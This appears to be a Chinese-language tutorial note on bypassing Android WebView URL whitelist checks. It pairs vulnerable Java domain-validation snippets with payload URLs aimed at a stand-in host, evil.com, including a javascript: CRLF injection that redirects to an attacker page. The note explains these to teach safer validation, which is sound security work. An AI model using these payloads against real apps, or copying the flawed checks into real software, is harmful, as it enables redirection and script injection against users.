# Webview白名单绕过


## Url绕过

RFC中URL格式定义:  

```Text
<protocol>://<user>:<password>@<host>:<port>/<url-path>
```

其中<user>:<password>部分是Authority字段，用来向所请求的访问受限资源提供用户凭证。比如访问一个需要认证的ftp资源，用户名为test，密码为123456，可以直接在浏览器中输入URL：ftp://test:123456@your.site/。  

以下是一些常见的Url检测和绕过的方式，内容来自参考链接。

- `indexOf(url)>0`绕过：

  ```java
  private static boolean checkDomain(String inputUrl)
  {
      String[] whiteList=new String[]{"site1.com","site2.com"};
      for (String whiteDomain:whiteList)
      {
          if (inputUrl.indexOf(whiteDomain)>0)
              return true;
      }
      return  false;
  }
  ```

  绕过方式: http://evil.com/poc.htm?site1.com

- `indexOf`提取域名校验

  ```java
  private static boolean checkDomain(String inputUrl)
  {
      String[] whiteList=new String[]{"site1.com","site2.com"};
      String tempStr=inputUrl.replace("http://","");
      String inputDomain=tempStr.substring(0,tempStr.indexOf("/")); //提取host
      for (String whiteDomain:whiteList)
      {
          if (inputDomain.indexOf(whiteDomain)>0)
              return true;
      }
      return  false;
  }
  ```

  提取`://`和`/`之间的字符串当作host进行校验
  payload: http://site1.com@evil.com/poc.htm

- URL类中的`getHost` + `indexOf`

  ```java
  private static boolean checkDomain(String inputUrl) throws MalformedURLException {
      String[] whiteList=new String[]{"site1.com","site2.com"};
      java.net.URL url=new java.net.URL(inputUrl);
      String inputDomain=url.getHost(); //提取host
      for (String whiteDomain:whiteList)
      {
          if (inputDomain.indexOf(whiteDomain))
              return true;
      }
      return  false;
  }
  ```

  payload: http://www.site1.com.evil.com/poc.html
  上述URL包含site1.com但是其中 www.site1.com 只是evil.com这个域名的子域名，还是指向攻击者控制的服务器。

- `getHost` + `endsWith`
  payload: http://evilsite1.com/

- `getHost` + `endsWith` + '.'

  ```java
  String inputDomain=url.getHost(); //提取host
  for (String whiteDomain:whiteList)
  {
      if (inputDomain.endsWith("."+whiteDomain)) //www.site1.com
          return true;
  }
  ```

  `getHost`方法并不一定能得到正确的域名信息
  payload: http://evil.com\\@www.site1.com/poc.html
  这里`getHost`得到的是www.site1.com 但是实际访问的是evil.com服务器，不过攻击页面不能叫poc.html，根据访问日志需要叫`/@.site.com/poc.html`(没具体验证这条，不懂为何www没了...)
  另一种绕过方法: http://evil.com\\.site1.com 这里`getHost`方法得到的是evil.com.site1.com但是实际访问的是evil.com服务器

- URI代替URL

  ```java
  private static boolean checkDomain(String inputUrl) throws  URISyntaxException {
      String[] whiteList=new String[]{"site1.com","site2.com"};
      java.net.URI url=new java.net.URI(inputUrl);
      String inputDomain=url.getHost(); //提取host
      for (String whiteDomain:whiteList)
      {
          if (inputDomain.endsWith("."+whiteDomain)) //www.site1.com
              return true;
      }
      return  false;
  }
  ```

  payload:

  ```java
  JavaScript://www.site1.com/%0d%0awindow.location.href='http://evil.com/poc.html'
  ```

  但是webview实际执行的是如下两行JavaScript代码:

  ```javascript
  //www.site1.com/ 
  window.location.href='http://evil.com/poc.html'
  ```

  第一行通过//符号来骗过java.net.URI获取到值为www.site1.com的host，恰好//符号在Javascript的世界里是行注释符号，所以第一行实际并没有执行；然后通过%0d%0a换行，继续执行window.location.href='http://evil.com/poc.html'请求poc页面.

- URI + 协议校验  

  payload: 

  ```Text
  http://www.site1.com/redirect.php?url=http://evil.com/poc.html
  ```

  Webview在请求http://www.site1.com/redirect.php?url=http://evil.com/poc.html 的时候，实际是发出了两次请求，第一次是在loadUrl中请求http://www.site1.com/redirect.php?url=http://evil.com/poc.html， 第二次是请求http://evil.com/poc.html ，但是第二次请求发生在loadUrl之后，而我们的白名单校验逻辑在loadUrl之前，才导致了绕过。

  所以需要重写webview的`shouldOverrideUrlLoading`方法，该方法会在webview后续加载其他url的时候回调。

参考链接:

[一文彻底搞懂安卓WebView白名单校验](https://www.cnblogs.com/rebeyond/p/10916076.html)


